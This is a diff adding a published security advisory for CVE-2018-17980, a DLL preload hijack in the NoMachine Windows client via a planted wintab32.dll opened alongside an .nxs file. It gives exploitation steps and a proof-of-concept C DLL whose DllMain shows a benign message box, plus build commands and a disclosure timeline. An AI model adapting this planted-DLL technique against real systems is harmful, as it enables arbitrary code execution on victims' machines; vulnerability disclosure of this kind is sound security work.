@@ -1,0 +1,111 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/NOMACHINE-TROJAN-FILE-REMOTE-CODE-EXECUTION.txt
+[+] ISR: ApparitionSec          
+ 
+Greetz: ***Greetz: indoushka | Eduardo ***
+
+[Vendor]
+www.nomachine.com
+
+
+[Product]
+NoMachine  <= v5.3.26
+
+NX technology, developed by NoMachine, and commonly known as "NX" is a proprietary computer program that provides desktop and remote access.
+It consists of a suite of products for desktop virtualization and application delivery for servers, and client software.
+
+
+
+[Vulnerability Type]
+Trojan File Remote Code Execution
+
+
+[Affected Component]
+wintab32.dll
+
+
+[CVE Reference]
+CVE-2018-17980
+
+
+[Security Issue]
+Possible arbitrary code execution when opening a ".nxs" nomachine file type on client's wintab32.dll preload.
+This issue regards the client part of all NoMachine installations on Windows (NoMachine free, NoMachine Enterprise Client, NoMachine Enteprise Desktop and NoMachine Cloud Server).
+
+1) create a 32 bit DLL named "wintab32.dll"
+2) create an native nomachine ".NXS" file and open it alongside the trojan "wintab32.dll" DLL from Network share or any dir.
+BOOM!
+
+
+[References]
+https://www.nomachine.com/TR10P08887
+
+
+
+[Exploit/POC]
+
+#include <windows.h>
+
+/* hyp3rlinx */
+
+/*
+gcc -c -m32 wintab32.c
+gcc -shared -m32 -o wintab32.dll wintab32.o
+*/
+
+void executo(){
+ MessageBox( 0, "3c184981367094fce3ab70efc3b44583" , ":)" , MB_YESNO + MB_ICONQUESTION );
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
+ switch(fdwReason){
+  case DLL_PROCESS_ATTACH:{
+	executo();
+	break;
+	}
+  case DLL_PROCESS_DETACH:{
+	executo();
+	break;
+	}
+  case DLL_THREAD_ATTACH:{
+	executo();
+	break;
+       }
+  case DLL_THREAD_DETACH:{
+	executo();
+	break;
+	}
+   }
+	return TRUE;
+}
+
+
+[Network Access]
+Remote
+
+
+
+[Severity]
+High
+
+
+
+[Disclosure Timeline]
+Vendor Notification: September 26, 2018
+Vendor verified vulnerability: September 28, 2018
+CVE assigned by Mitre: October 4, 2018
+Vendor release fixed version: October 11, 2018
+October 11, 2018 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
